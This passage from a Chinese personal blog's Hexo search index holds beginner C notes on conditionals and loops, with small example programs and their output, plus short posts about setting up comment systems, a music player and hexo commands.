<h3 id="（2）if-else与switch-case"><a href="#（2）if-else与switch-case" class="headerlink" title="（2）if else与switch-case"></a>（2）if else与switch-case</h3><p>以下两种代码实现的是一种功能</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int type=0;
&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");
&nbsp; &nbsp; scanf("%d",&amp;type);
&nbsp; &nbsp; if ( type==1 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("1");
&nbsp; &nbsp; else if ( type==2 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("2");
&nbsp; &nbsp; else if ( type==3 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("3");
&nbsp; &nbsp; else if ( type==4 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("4");
&nbsp; &nbsp; else if ( type==5 )
&nbsp; &nbsp; &nbsp; &nbsp; printf("5");
&nbsp; &nbsp; else
&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int type=0;
&nbsp; &nbsp; printf("请输入1-5以内的数字来获取回应\n");
&nbsp; &nbsp; scanf("%d",&amp;type);
&nbsp; &nbsp; switch (type) {
&nbsp; &nbsp; &nbsp; &nbsp; case 1:
&nbsp; &nbsp; &nbsp; &nbsp; print("1");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 2:
&nbsp; &nbsp; &nbsp; &nbsp; printf("2");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 3:
&nbsp; &nbsp; &nbsp; &nbsp; printf("3");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 4:
&nbsp; &nbsp; &nbsp; &nbsp; printf("4");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; case 5:
&nbsp; &nbsp; &nbsp; &nbsp; printf("5");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; &nbsp; &nbsp; default:
&nbsp; &nbsp; &nbsp; &nbsp; printf("格式错误");
&nbsp; &nbsp; &nbsp; &nbsp; break;
&nbsp; &nbsp; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>结论都是一样的</p>
<h2 id="四、while和do-while"><a href="#四、while和do-while" class="headerlink" title="四、while和do while"></a>四、while和do while</h2><h3 id="（1）while-1"><a href="#（1）while-1" class="headerlink" title="（1）while"></a>（1）while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int o=0;
&nbsp; &nbsp; while ( o&lt;10)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; o++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",o);
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>简称来说就是当条件成立时 一直重复运行某物</p>
<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">1
2
3
4
5
6
7
8
9
10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="2-do-while"><a href="#2-do-while" class="headerlink" title="(2) do while"></a>(2) do while</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int i=0;
&nbsp; &nbsp; do
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; &nbsp; &nbsp; printf("%d",i);
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; } while ( i != 10);
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>while的换了个顺序版本<br>结果都是一样的就不放出来了</p>
<h2 id="五、整合一下先"><a href="#五、整合一下先" class="headerlink" title="五、整合一下先"></a>五、整合一下先</h2><h3 id="（1）比大小"><a href="#（1）比大小" class="headerlink" title="（1）比大小"></a>（1）比大小</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main(){
&nbsp; &nbsp; int a,b,c,max;
&nbsp; &nbsp; printf("请输入三个数字 以逗号隔开\n");
&nbsp; &nbsp; scanf("%d,%d,%d",&amp;a,&amp;b,&amp;c);
&nbsp; &nbsp; if(a&gt;b){ &nbsp;
	&nbsp; &nbsp; max = a;
&nbsp; &nbsp; }else{
	&nbsp; &nbsp; max = b;
&nbsp; &nbsp; }
&nbsp; &nbsp; if(c&gt;max){
	&nbsp; &nbsp; max = c;
&nbsp; &nbsp; }
&nbsp; &nbsp; printf("max=%d", max);
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出:</p>
<pre class="line-numbers language-none"><code class="language-none">请输入三个数字 以逗号隔开
3,1,6 
max=6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="（2）九九乘法表"><a href="#（2）九九乘法表" class="headerlink" title="（2）九九乘法表"></a>（2）九九乘法表</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
int main()
{
&nbsp; &nbsp; int n=9;
&nbsp; &nbsp; int i,j;
&nbsp; &nbsp; i=1;
&nbsp; &nbsp; while (i&lt;=n)
&nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; j=1;
&nbsp; &nbsp; &nbsp; &nbsp; while (j&lt;=i)
&nbsp; &nbsp; &nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("%d*%d=%d",j,i,j*i);
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((i*j&lt;10))
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp; ");
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;");
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j++;
&nbsp; &nbsp; &nbsp; &nbsp; }
&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");
&nbsp; &nbsp; &nbsp; &nbsp; i++;
&nbsp; &nbsp; }
&nbsp; &nbsp; return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出:</p>
<pre class="line-numbers language-none"><code class="language-none">1*1=1   
1*2=2   2*2=4   
1*3=3   2*3=6   3*3=9   
1*4=4   2*4=8   3*4=12  4*4=16  
1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  
1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  
1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  
1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64
1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
      <categories>
        <category>学习</category>
        <category>c语言</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>关于加入aplayer的方式</title>
    <url>/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>因为找到工作了所以更新会稍微有点摸<br>总之先来试一下网易云的html是否可以加入音乐播放</p>
<p>就很怪<br>网易云-生成外链播放器 再加上hexo中的md语法支持html自然可以成功<br>可是根据网上教程在主页左下角生成一个播放器的方式无法正常运行<br>下次再说吧</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
  </entry>
  <entry>
    <title>再来一次</title>
    <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>关于在next7.8.0中建设评论功能这件事</title>
    <url>/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
    <content><![CDATA[<html><head><link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script></head><body><p>于是乎今天忙了一整天尝试在网页中建设评论功能<br>next版本为7.8.0<br>这些是我的尝试过程和失败的结果  最终使用了畅言云评完成了此功能的测试 但还仍需改进<br>接下来是每个评论模块的分别介绍<br><b>如果要看具体配置过程可以去找我在文章中留下的网址 本人小白一个 不是太懂 谢谢</b></p>
<span id="more"></span>


<h2 id="valine与waline"><a href="#valine与waline" class="headerlink" title="valine与waline"></a>valine与waline</h2><p>waline由valine衍生而出</p>
<blockquote>
<p>Valine 特性</p>
</blockquote>
<ul>
<li>快速</li>
<li>安全</li>
<li>Emoji 😉</li>
<li>无后端实现</li>
<li>MarkDown 全语法支持</li>
<li>轻量易用(~15kb gzipped)</li>
<li>文章阅读量统计 v1.2.0+</li>
</ul>
<blockquote>
<p>Waline 与 Valine 最大的不同就是增加了服务端中间层，解决 Valine 暴露出来的安全问题。同时基于服务端的特性，提供了<strong>邮件通知</strong>、<strong>微信通知</strong>、<strong>评论后台管理</strong>、LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL&nbsp;<strong>多存储服务支持</strong>等诸多特性。 —-<a href="https://zhuanlan.zhihu.com/p/295264916">摘自知乎</a></p>
</blockquote>
<p>我两个都试过了，valine方面参考了<a href="https://valine.js.org/">valine官方页面</a>  <a href="https://blog.csdn.net/wugenqiang/article/details/105744843">此教程</a><br>waline方面则是参考了<a href="https://waline.js.org/guide/deploy/vps.html">waline官方页面</a>  <a href="https://zhuanlan.zhihu.com/p/535607671">这个教程</a></p>
<p>首先是在尝试时踩的坑:<br>1.valine在部署时使用的leadcloud需使用国际版，否则将需要网站备案<br>2.next7.0+的版本不会内置valine的文件，需要自己下载valine.min.js并配置cdn<br>3.统计<strong>访问人数</strong>和<strong>访问总量</strong>的系统也是由valine支持,想要同时开启会报错</p>
<p>valine这边在全都按照流程过了一遍确认无误后却发现网页没有评论系统出现<br>只得作罢<br>waline由于next主题中的config.yml没有自带选项 需要复制粘贴<br>在确认过复制到的地区没问题的情况下 hexo s持续爆warning<br>只得作罢×2</p>
<p>害…过几天再试吧 都是泪啊</p>
<h2 id="gitalk"><a href="#gitalk" class="headerlink" title="gitalk"></a>gitalk</h2><blockquote>
<p>Gitalk 特性</p>
</blockquote>
<ul>
<li>使用 GitHub 登录</li>
<li>支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru]</li>
<li>支持个人或组织</li>
<li>无干扰模式（设置 distractionFreeMode 为 true 开启）</li>
<li>快捷键提交评论 （cmd|ctrl + enter）</li>
</ul>
<p>是github官方的评论功能<br>参考了<a href="https://www.jianshu.com/p/02fc71f3633f">这个教程</a></p>
<p>安装后本地配置显示<strong>network error</strong><br>hexo g hexo d后也是相同的问题<br>搜索后发现是由于github网络地区特殊无法获取端口导致</p>
<p>但目前没有具体的解决方式</p>
<h2 id="畅言云评"><a href="#畅言云评" class="headerlink" title="畅言云评"></a>畅言云评</h2><p><a href="https://blog.csdn.net/lcyaiym/article/details/76762074">参考了这个教程</a><br>安装很简单 注册很简单 配置也只要输入appid 和appkey<br>但是具体出来的效果不太行 等待后期优化吧</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>目前的进展</title>
    <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>参考<code><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/">https://asdfv1929.github.io/2018/01/25/crash-cheat/</a></code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<b>超级慢</b></p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
      <tags>
        <tag>告示</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑小提示</title>
    <url>/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所有hexo命令前加上npx<br>gitbash中的复制粘贴是ctrl+install shift+install<br>改完元素后记得<br><code>npx hexo clean<br>npx hexo g</code><br>本地测试效果用npx hexo s 随后用localhost:4000来连接<br>上传到网络是npx hexo d<br>接下来进一步升级网页<br>三部曲改为<br><code>hexo clean<br>hexo g<br>gulp<br>hexo d</code><br>来优化网页</p>
</body></html>]]></content>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>创建个人主页！</title>
    <url>/2023/06/28/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>没啥事干所以就创建了<br>这里多半会写课上的笔记<br>在hexo中遇到的技术难关<br>请多指教</p>
</body></html>]]></content>
      <categories>
        <category>日常牢骚</category>
      </categories>
  </entry>
</search>
